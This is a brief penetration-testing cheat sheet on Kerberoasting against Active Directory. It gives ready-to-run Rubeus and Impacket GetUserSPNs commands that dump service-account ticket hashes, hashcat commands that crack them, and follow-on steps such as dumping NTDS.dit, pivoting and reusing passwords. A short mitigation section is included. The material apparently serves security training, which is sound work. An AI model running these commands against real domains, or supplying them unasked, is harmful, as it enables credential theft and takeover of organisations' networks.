# Kerberoasting with Rubeus and Impacket
- Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. 

**Other tools for Kerberoasting**
- BloodHound
- Kekeo
- Invoke-Kerberoast

## Rubeus

- To dump the hash of any kerberoastable user
```
Rubeus.exe kerberoast
```
- Cracking the hash obtained from kerberoasting
```
hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

## Impacket 
- Navigate to the directory containing `GetUserSPNs.py`
- Dump the Kerberos hash for all kerberoastable accounts on the target domain
```
sudo python3 GetUserSPNs.py CONTROLLER.local/USERNAME:PASSWORD -dc-ip <IP> -request
```
- Crack the hash
```
hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

## Kerberoasting Mitigation 

- Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
- Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won'tbe as effective if you don't make service accounts domain admins.

### What next ? 
- If the service account is a domain admin and we have a control similar to golden/silver ticket 
  - dump NTDS.dit
- If it's not a domain admin  
  - Use this account to pivot or escalate 
  - Use the cracked password against other services and domain admin accounts
